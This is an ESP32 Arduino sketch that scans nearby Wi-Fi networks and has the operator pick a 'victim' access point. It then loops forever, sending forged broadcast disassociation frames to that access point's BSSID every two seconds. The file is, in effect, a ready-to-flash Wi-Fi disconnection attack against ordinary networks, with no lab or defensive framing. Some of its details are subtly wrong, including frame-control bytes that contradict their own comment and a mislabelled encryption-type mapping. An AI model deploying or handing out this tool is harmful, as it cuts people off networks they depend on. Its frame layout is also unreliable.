#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi_types.h"

typedef struct{   // Network Structure
  int id;
  String bssid;
  String ssid;
  int32_t rssi;
  int ch;
  String enc;
  char* essid;

} NetworkProperties;

void cleanSerialBuffer(){   // Clean the Serial Buffer
  while (Serial.available() > 0) {
    Serial.read();
  } 
}

NetworkProperties NetworkScan(){    // Scans for nearby networks 
  Serial.println("Scanning networks...");
  int networksFound = WiFi.scanNetworks();

  if(!networksFound){
    Serial.println("No networks found");
    return NetworkProperties();
  }
  
  NetworkProperties allNetworks[networksFound];
  Serial.println("ID   BSSID                PWR     CH     ENC            ESSID");

  for(int i=0; i<networksFound; i++){   // Assigns the network properties
    allNetworks[i].id = i;
    allNetworks[i].bssid = WiFi.BSSIDstr(i);
    allNetworks[i].ssid = WiFi.SSID(i);
    allNetworks[i].rssi = WiFi.RSSI(i);
    allNetworks[i].ch = WiFi.channel(i);
    
    switch(WiFi.encryptionType(i)){
      case 0:
        allNetworks[i].enc = "WEP";
        break;
      case 1:
        allNetworks[i].enc = "TKIP";
        break;
      case 2:
        allNetworks[i].enc = "AES";
        break;
      case 3:
        allNetworks[i].enc = "WPA2_AES";
        break;
      default:
      allNetworks[i].enc = "Unknown";
      break;
    }


  }

  for (int i = 0; i < networksFound; i++) {
    Serial.print(String(allNetworks[i].id) + "    ");
    Serial.print(allNetworks[i].bssid + "   ");
    Serial.print(allNetworks[i].rssi);
    Serial.print("      ");
    Serial.print(allNetworks[i].ch);
    Serial.print("     ");
    Serial.print(allNetworks[i].enc);
    Serial.print("        ");
    Serial.println(allNetworks[i].ssid);
  }
  
  Serial.println("Scan again? (1 for yes, 0 for no)");

  int scanNetworks = -1;    // Start with invalid value
  cleanSerialBuffer();
  while(scanNetworks == -1){
    if(Serial.available() > 0){
      scanNetworks = Serial.parseInt();   // Read the input
    }
  }

  if(scanNetworks == 1) {
    return NetworkProperties();   // Return empty object to initiate another scan
  }

  Serial.println("Please select the access point (enter ID):");   // Ask to select an access point

  int accessPoint = -1;   // Start with invalid value
  cleanSerialBuffer();
  while (accessPoint < 0) {
    String input = "";
    while (Serial.available() > 0) {
      char c = Serial.read();   // Read character by character
      if (c == '\n' || c == '\r') {
        break;    // Stop reading when Enter is pressed
      }
      input += c;   // Append character to input string
    }

    if (input.length() > 0) {
      accessPoint = input.toInt();    // Convert string to integer
      if (accessPoint >= 0 && accessPoint < networksFound) {
        break;    // Valid input, exit loop
      } else {
        Serial.println("Invalid ID. Please try again.");
        accessPoint = -1;   // Invalid input, prompt again
      }
    }
  }

  cleanSerialBuffer();

  return allNetworks[accessPoint];  // Return the selected network

}

void sendRawDisassocPacket(uint8_t *frame, size_t len) {    //Sends the packet
  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);

  if (ret == ESP_OK) {
      Serial.println("\nRaw disassociation frame sent successfully");
  } else {
      Serial.println("\nFailed to send raw disassociation frame");
  }

}

void macToHex(String macAddress, String mac[6]){    // Converts mac address to seperate hex values
  for (int i = 0, t=0; i < macAddress.length(); i += 3, t++) {
    // Take the two characters before the colon
    String byteStr = "0x" + macAddress.substring(i, i + 2);
    
    mac[t] = byteStr;

  }

}

void DisassocPacket(NetworkProperties victimNetwork){   //

  String mac[6];
  macToHex(victimNetwork.bssid, mac);
  uint8_t destAddr0 = (uint8_t)strtol(mac[0].c_str(), NULL, 16);
  uint8_t destAddr1 = (uint8_t)strtol(mac[1].c_str(), NULL, 16);
  uint8_t destAddr2 = (uint8_t)strtol(mac[2].c_str(), NULL, 16);
  uint8_t destAddr3 = (uint8_t)strtol(mac[3].c_str(), NULL, 16);
  uint8_t destAddr4 = (uint8_t)strtol(mac[4].c_str(), NULL, 16);
  uint8_t destAddr5 = (uint8_t)strtol(mac[5].c_str(), NULL, 16);
  uint8_t disassocFrame[] = {
    0xA, 0x0, // Frame Control: 0xC0 for disassoc frame
    0x3A, 0x01, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination Address (MAC of the victim)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source Address
    destAddr0, destAddr1, destAddr2, destAddr3, destAddr4, destAddr5, // BSSID: AP MAC address
    0x0, 0x0, // Sequence Control: Set to zero
    0x07, 0x0  // Reason Code: 0x0007 for disassociation
  };
  sendRawDisassocPacket(disassocFrame, sizeof(disassocFrame));

}

void setup() {
  Serial.begin(115200);   // Set baud rate as 115200
}

void loop() {
  delay(1000);    // Wait for 1 second
  WiFi.mode(WIFI_STA);    // Set ESP32 to Station mode (not AP mode)
  WiFi.disconnect();    // Disconnect from any previous networks
  delay(500);   // Wait for 0.5 second

  NetworkProperties victimNetwork = NetworkScan();
  while(victimNetwork.bssid == ""){   //Scan again if 1 is pressed
    victimNetwork = NetworkScan();
  }

  while(1){
    DisassocPacket(victimNetwork);
    delay(2000);
  }


}
